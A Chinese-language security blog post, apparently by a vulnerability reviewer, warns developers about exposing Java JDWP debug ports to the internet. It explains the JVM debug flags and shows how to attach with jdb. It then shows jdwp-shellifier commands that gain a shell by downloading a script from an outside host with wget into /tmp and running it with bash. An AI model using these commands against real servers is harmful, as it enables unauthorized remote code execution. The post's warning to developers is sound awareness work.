开发的同事不经意留给安全的坑—JDWP

    前些日子审核漏洞的时候，发现有小伙伴提交关于外网javadebug端口的漏洞，当时没太在意，觉得应该是偶然现象，再次收到这种漏洞的时候有点警惕了，用脚本扫描了一下，结果发现，开发的同学们还真是留了不少大坑啊。

      JDWP，Java Debug Wire Protocol（java调试线协议），是Debugger和target vm之间的通信协议。程序员在开发过程中，需要远程调试的话，就可以用这个方法来实现。任意的语言都能实现JDWP。

将下面的代码选项添加进java的启动脚本就可以了。

JAVA_OPTS="$JAVA_OPTS -Xdebug -Xrunjdwp:transport=dt_socket,address=8787,server=y,suspend=y"  

      各个选项参数的含义：

-XDebug 启用调试；
-Xrunjdwp 加载JDWP的JPDA参考执行实例；
transport 用于在调试程序和VM使用的进程之间通讯；
dt_socket 套接字传输；
server=y/n VM是否需要作为调试服务器执行；
address=7899 调试服务器监听的端口号；
suspend=y/n 是否在调试客户端建立连接之后启动 VM 。

终于说到正题了，端口号，因为手头没有现成的案例，所以没有办法截图，只能从网上搜了一下。

开启调试后，jdb –attach ip:port，这样的形式就是能连接该端口了。

成功之后显示如下图：


threads可以查看当前进程。

thread 进程号（如0x690），查看单独进程。

suspend 进程号，挂起进程。

wherei，查看可以设置的断点。

stop 断点位置，设置断点。

通常利用的方法，是挂起一个8080端口的进程，在连接的地方设置断点，然后使用浏览器访问8080，出现breakpoint hit，就可以调试程序了。

当然，我这种记性不好and手艺不精的人，更倾向于有一种简单点的方法可以getshell，那就是jdwp-shellifier，感谢其作者 IOActive。

这是一个专门针对jdwp开发的脚本，可以测试，可以连接，还能执行系统命令。

python jdwp-shellifier.py –t ip –p port

反弹shell的姿势：

jdwp-shellifier.py –t ip –p port –cmd "wget http://x.x.x.x/x.txt -O /tmp/x.sh"

jdwp-shellifier.py -t 目标IP -p 端口 –cmd "bash /tmp/x.sh"

但脚本对jdk版本支持不完整，遇到jdk1.8的话可能就不太好用了。

总之，各位开发小伙伴，最好不要在外网开放java的调试端口，被干了找谁说理去呢……
